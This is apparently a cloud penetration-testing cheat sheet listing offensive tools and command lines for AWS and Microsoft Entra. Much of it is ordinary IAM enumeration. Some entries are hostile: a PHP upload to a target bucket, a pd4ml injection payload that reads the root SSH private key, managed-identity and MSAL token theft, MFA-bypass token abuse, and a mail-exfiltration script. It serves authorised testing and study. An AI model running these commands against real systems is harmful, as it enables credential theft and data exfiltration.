# Cloud

- [Resources](#resources)

## Table of Contents

- [AWS](#aws)
- [Entra](#entra)
- [GraphRunner](#graphrunner)
- [lazys3](#lazys3)
- [Pacu](#pacu)
- [S3 Account Search](#s3-account-search)

## Resources

| Name | Description | URL |
| --- | --- | --- |
| ADOKit | Azure DevOps Services Attack Toolkit | https://github.com/xforcered/ADOKit |
| aws-enumerator | The AWS Enumerator was created for service enumeration and info dumping for investigations of penetration testers during Black-Box testing. The tool is intended to speed up the process of Cloud review in case the security researcher compromised AWS Account Credentials. | https://github.com/shabarkin/aws-enumerator |
| AWS Security Checklist | Made by Bour Abdelhadi | https://awscheck.fyi |
| AWeSomeUserFinder | AWS IAM Username Enumerator and Password Spraying Tool in Python3 | https://github.com/dievus/AWeSomeUserFinder |
| AzureHound | Azure Data Exporter for BloodHound | https://github.com/BloodHoundAD/AzureHound |
| BARK | BloodHound Attack Research Kit | https://github.com/BloodHoundAD/BARK |
| Bobber | Bounces when a fish bites - Evilginx database monitoring with exfiltration automation | https://github.com/Flangvik/Bobber |
| CloudPEASS | Cloud Privilege Escalation Awesome Script Suite | https://github.com/carlospolop/CloudPEASS |
| FindMeAccess | FindMeAccess is a tool useful for finding gaps in Azure/M365 MFA requirements for different resources, client ids, and user agents. | https://github.com/absolomb/FindMeAccess |
| GraphRunner | A Post-exploitation Toolset for Interacting with the Microsoft Graph API | https://github.com/dafthack/GraphRunner |
| HacktricksCloud | Welcome to the page where you will find each hacking trick/technique/whatever related to Infrastructure. | https://github.com/carlospolop/hacktricks-cloud |
| lazys3 | A Ruby script to bruteforce for AWS s3 buckets using different permutations. | https://github.com/nahamsec/lazys3 |
| MFASweep | A tool for checking if MFA is enabled on multiple Microsoft Services | https://github.com/dafthack/MFASweep |
| o365-attack-toolkit | A toolkit to attack Office365 | https://github.com/mdsecactivebreach/o365-attack-toolkit |
| o365recon | retrieve information via O365 and AzureAD with a valid cred | https://github.com/nyxgeek/o365recon |
| Pacu | The AWS exploitation framework, designed for testing the security of Amazon Web Services environments. | https://github.com/RhinoSecurityLabs/pacu |
| Power Pwn | An offensive and defensive security toolset for Microsoft 365 Power Platform | https://github.com/mbrg/power-pwn |
| ROADtools | A collection of Azure AD tools for offensive and defensive security purposes | https://github.com/dirkjanm/ROADtools |
| S3 Account Search | his tool lets you find the account id an S3 bucket belongs too. | https://github.com/WeAreCloudar/s3-account-search |
| S3cret Scanner | Hunting For Secrets Uploaded To Public S3 Buckets | https://github.com/Eilonh/s3crets_scanner |
| ScubaGear | Automation to assess the state of your M365 tenant against CISA's baselines | https://github.com/cisagov/ScubaGear |
| SeamlessPass | A tool leveraging Kerberos tickets to get Microsoft 365 access tokens using Seamless SSO | https://github.com/Malcrove/SeamlessPass |
| TeamFiltration | TeamFiltration is a cross-platform framework for enumerating, spraying, exfiltrating, and backdooring O365 AAD accounts | https://github.com/Flangvik/TeamFiltration |
| TokenTactics v2 | A fork of the great TokenTactics with support for CAE and token endpoint v2 | https://github.com/f-bader/TokenTacticsV2 |

## AWS

### Installation

```console
$ curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip" \
   && unzip awscliv2.zip"
```

```console
$ sudo ./aws/install
```

### Configuration

```console
$ aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

### Configuration with Profile

```console
$ aws configure --profile <PROFILE>
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

### Verification

```console
$ aws sts get-caller-identity --profile <PROFILE>
```

### List Buckets

```console
$ aws --endpoint-url=http://s3.<RHOST> s3api list-buckets
```

### List Tables

```console
$ aws dynamodb list-tables --endpoint-url http://s3.<RHOST>/
```

### List Users

```console
$ aws dynamodb scan --table-name users --endpoint-url http://s3.<RHOST>/
```

### Upload Files

```console
$ aws s3api put-object --endpoint-url http://s3.<RHOST>/ --bucket adserver --key <FILE>.php --body /PATH/TO/FILE/<FILE>.php
```

### Alternativ Upload Technique

```console
$ aws --endpoint-url=http://s3.<RHOST> s3 cp /PATH/TO/FILE/<FILE>.php s3://adserver
```

### Create Table

```console
$ aws dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S --key-schema AttributeName=title,KeyType=HASH --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url=http://s3.<RHOST>
```

### Extract Data into Table

```console
$ aws dynamodb put-item --table-name alerts --item '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' --endpoint-url=http://s3.<RHOST>
```

### List Keys

```console
$ aws --endpoint-url http://127.0.0.1:4566 kms list-keys
```

### List Secrets

```console
$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager list-secrets
```

### Get Secret Values

```console
$ aws --endpoint-url http://127.0.0.1:4566 secretsmanager get-secret-value --secret-id "<VALUE>" --version-stage AWSCURRENT
```

### KMS Enable Key

```console
$ aws --endpoint-url http://127.0.0.1:4566 kms enable-key --key-id f2358fef-e813-4c59-87c8-70e50f6d4f70
```

### KMS Decrypt

```console
$ aws --endpoint-url http://127.0.0.1:4566 kms decrypt --ciphertext-blob mXMs+8ZLEp9krGLLJT2YHLgHQP/uRJYSfX+YTqar7wabvOQ8PSuPwUFAmEJh86q3kaURmnRxr/smZvkU6Pp0KPV7ye2sP10hvPJDF2mkNcIEVif3RaMU08jZi7U/ghZyoXseM6EEcu9c1gYpDqZ74CMEh7AoasksLswCJJZYI0TfcvTlXx84XBfCWsK7cTyDb4SughAq9MY89Q6lt7gnw6IwG/tSHi9a1MY8eblCwCMNwRrFQ44x8p3hS2FLxZe2iKUrpiyUDmdThpFJPcM3uxiXU+cuyZJgxzQ2Wl0Gqaj0RpVD2w2wJGrQBnCnouahOD1SXT3DwrUMWXyeNMc52lWo3aB+mq/uhLxcTeGSImHJcfUYYQqXoIrOHcS7O1WFoaMvMtIAl+uRslGVSEwiU6sVe9nMCuyvrsbsQ0N46jjro5h1nFmTmZ0C1Xr97Go/pHmJxgG1lxnOepsglLrPMXc5F6lFH1aKxlzFVAxGKWNAzTlzGC+HnBXjugLpP8Shpb24HPdnt/fF/dda8qyaMcYZCOmLODums2+ROtrPJ4CTuaiSbOWJuheQ6U/v5AbeQSF93RF28iyiA905SCNRi3ejGDH65OWv6aw1VnTf8TaREPH5ZNLazTW5Jo8kvLqJaEtZISRNUEmsJHr79U1VjpovPzePTKeDTR0qosW/GJ8= --key-id 804125db-bdf1-465a-a058-07fc87c0fad0 --encryption-algorithm RSAES_OAEP_SHA_256 --output text --query Plaintext | base64 --decode > output
```

### Abuse Access Control List (ACL) Misconfiguration

```console
$ aws s3 ls s3://{<BUCKET>} --no-sign-request
$ aws s3 ls s3://<COMPANY>
```

### Searching for Usernames in JSON Files

```console
$ grep -r userName | sort -u
$ grep -h -A 10 <USERNAME> <FILE>
```

### Get-Caller-Identity

```console
$ aws sts get-caller-identity
```

### Get-User-Policies

```console
$ aws iam list-user-policies --user-name <USERNAME>
$ aws iam get-user-policy --user-name <USERNAME> --policy-name <POLICY>
```

### Assume-Role

```console
$ aws sts assume-role --role-arn arn:aws:iam::107513503799:role/AdminRole --role-session-name <SESSION>
```

### Set Session Token

```console
$ aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

```console
$ aws configure set aws_session_token "IQo<--- SNIP --->xY="
```

### Access S3 Bucket

```console
$ aws configure
AWS Access Key ID [None]: AKIAIOSFODNN7EXAMPLE
AWS Secret Access Key [None]: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
Default region name [None]: us-west-2
Default output format [None]: json
```

```console
$ aws s3 ls s3://<BUCKET>
```

### Download from S3 Bucket

```console
$ aws s3 cp s3://<BUCKET>/<FILE> .
```

### Identity and Access Management (IAM) Enumeration

#### List IAM Users

```console
$ aws iam list-users
```

#### Get User Permissions

##### List attached Managed Policies

```console
$ aws iam list-attached-user-policies --user-name <USERNAME>
```

##### List Inline Policies

```console
$ aws iam list-user-policies --user-name <USERNAME>
```

##### Get Inline Policy Details

```console
$ aws iam get-user-policy --user-name <USERNAME> --policy-name <POLICY>
```

#### List IAM Groups and Permissions

##### List Groups for a User

```console
$ aws iam list-groups-for-user --user-name <USERNAME>
```

##### List Group Policies

```console
$ aws iam list-attached-group-policies --group-name <GROUP>
$ aws iam list-group-policies --group-name <GROUP>
```

##### Get Inline Group Policy Details

```console
$ aws iam get-group-policy --group-name <GROUP> --policy-name <POLICY>
```

#### List IAM Roles and Permissions

##### List all Roles

```console
$ aws iam list-roles
```

##### Get Role Details (Trust Policy)

```console
$ aws iam get-role --role-name <Role>
```

##### List attached Policies

```console
$ aws iam list-attached-role-policies --role-name <Role>
```

##### List Inline Policies

```console
$ aws iam list-role-policies --role-name <Role>
```

##### Get Inline Role Policy Details

```console
$ aws iam get-role-policy --role-name <Role> --policy-name <POLICY>
```

#### Get and decode Policy Documents

##### Get a Managed Policy Document (by ARN or Name)

```console
$ aws iam get-policy --policy-arn <POLICY>
$ aws iam get-policy-version --policy-arn <POLICY> --version-id <ID>
```

#### View Full IAM Snapshot

##### Dump all IAM Permissions (Users, Roles, Groups, Policies)

```console
$ aws iam get-account-authorization-details
```

Use this to build a full IAM permissions map. Add `--filter` to target `roles`, `users`, `groups` specifically.

## Entra

### Privilege Escalation

> https://learn.microsoft.com/en-us/cli/azure/

```console
$ az login --service-principal -u "20acc5dd-ffv4-41ac-a1p5-d321328da49a" --certificate <CERTIFICATE>.pem --tenant "2590cdef-687d-493c-ae4d-442cbab53a72"
```

```console
$ az resource list
```

```console
$ az role assignment list --all
```

```console
$ az webapp ssh --resource-group <GROUP> --name <NAME>
```

```console
$ env
```

```console
$ env | grep IDENTITY
```

```console
$ curl -s -H "X-Identity-Header: $IDENTITY_HEADER" "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=https://management.azure.com/”
```

```console
$ Connect-AzAccount -AccessToken
```

### Token Abuse for MFA Bypass

> https://github.com/dafthack/MFASweep/

```console
PS /> Import-Module ./MFASweep.ps1
PS /> Invoke-MFASweep -Username <USERNAME>@<DOMAIN> -Password <PASSWORD>
PS /> az login -u <USERNAME>@<DOMAIN> -p <PASSWORD>
```

```console
PS /> cat  ~/.azure/msal_token_cache.json
```

or

```console
PS /> cat  ~/.Azure/msal_token_cache.json
```

> https://github.com/f-bader/TokenTacticsV2

```console
PS /> Import-Module .\TokenTactics.psm1
PS /> Invoke-RefreshToMSGraphToken -domain <DOMAIN> -refreshToken "<TOKEN>"
PS /> $MSGraphToken
PS /> $MSGraphToken.access_token
```

or

```console
$ curl -s https://raw.githubusercontent.com/f-bader/TokenTacticsV2/main/modules/Get-
ForgedUserAgent.ps1 | grep UserAgent | awk -F"= " '{ print $2 }' | sort -u
```

> https://github.com/rootsecdev/Azure-Red-Team

> https://github.com/rootsecdev/Azure-Red-Team/blob/master/Tokens/exfil_exchange_mail.py

```console
PS /> python3 exfil_exchange_mail.py
```

## GraphRunner

> https://github.com/dafthack/GraphRunner

```console
$ pwsh
PS> . ./GraphRunner.ps1
PS> List-GraphRunnerModules
PS> Get-GraphTokens
PS> Get-SecurityGroups
PS> Get-SecurityGroups -Tokens $tokens
PS> Get-UpdatableGroups -Tokens $tokens
PS> Get-DynamicGrous -Tokens $tokens
PS> Invoke-InviteGuest -Tokens $tokens
PS> Invoke-SecurityGroupCloner -Tokens $tokens
```

## lazys3

> https://github.com/nahamsec/lazys3

```console
$ ruby lazys3.rb <DOMAIN>
```

## Pacu

> https://github.com/RhinoSecurityLabs/pacu

### Installation

```console
$ pipx install git+https://github.com/RhinoSecurityLabs/pacu.git
```

### Setup

```console
$ pacu                                                          
No database found at /home/kali/.local/share/pacu/sqlite.db
Database created at /home/kali/.local/share/pacu/sqlite.db


 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣿⣿⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡿⠛⠉⠁⠀⠀⠈⠙⠻⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⡿⣿⣿⣷⣦⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣈⣉⣙⣛⣿⣿⣿⣿⣿⣿⣿⣿⡟⠛⠿⢿⣿⣷⣦⣄⠀⠀⠈⠛⠋⠀⠀⠀⠈⠻⣿⣷⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣈⣉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣀⣀⣀⣤⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣆⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣬⣭⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢛⣉⣉⣡⣄⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣶⣄⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣁⣤⣶⡿⣿⣿⠉⠻⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢻⣿⣧⡀
 ⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⣠⣶⣿⡟⠻⣿⠃⠈⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣧
 ⢀⣀⣤⣴⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣾⣿⠉⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿
 ⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⡟
 ⠀⠀⠀⠀⠉⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⡟⠁
 ⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⡀⠀⠀⠀⠀⠀⣴⣆⢀⣴⣆⠀⣼⣆⠀⠀⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣿⠿⠋⠀⠀
 ⠀⠀⠀⣼⣿⣿⣿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠓⠒⠒⠚⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀
 ⠀⠀⠀⣿⣿⠟⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣶⡀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣷⡄⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⣆⠀⢰⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠘⠁⠀⠀⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢿⣿⣿⡇⠀⢸⣿⣿⡿⠛⠛⢻⣿⣿⣿⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠸⠿⠿⠟⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⣧⣤⣤⣼⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⡇⠀⠀⢀⣀⣀⣀⠀⢸⣿⣿⣿⠀⠀⠀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠉⠉⠉⠉⠀⠀⠀⢸⣿⣿⡏⠉⠉⢹⣿⣿⡇⠀⢸⣿⣿⣇⣀⣀⣸⣿⣿⣿⠀⢸⣿⣿⣿⣀⣀⣀⣿⣿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⢸⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⠛⠛⠃⠀⠀⠘⠛⠛⠃⠀⠀⠉⠛⠛⠛⠛⠛⠛⠋⠀⠀⠀⠀⠙⠛⠛⠛⠛⠛⠉⠀

Version: unknown
What would you like to name this new session? <SESSION>
```

### Common Commands

```console
Pacu (lab:No Keys Set) > search <MODULE>
```

## S3 Account Search

### Installation

```console
$ pipx install s3-account-search
```

### AWS Configuration

```console
$ aws configure
```

### Verify AWS Configuration

```console
$ aws sts get-caller-identity
```

### Get Region

```console
$ curl -I https://<RHOST>.s3.amazonaws.com
```

### Search S3 Account ID

```console
$ s3-account-search arn:aws:iam::422645307575:role/<BUCKET> <RHOST>
```
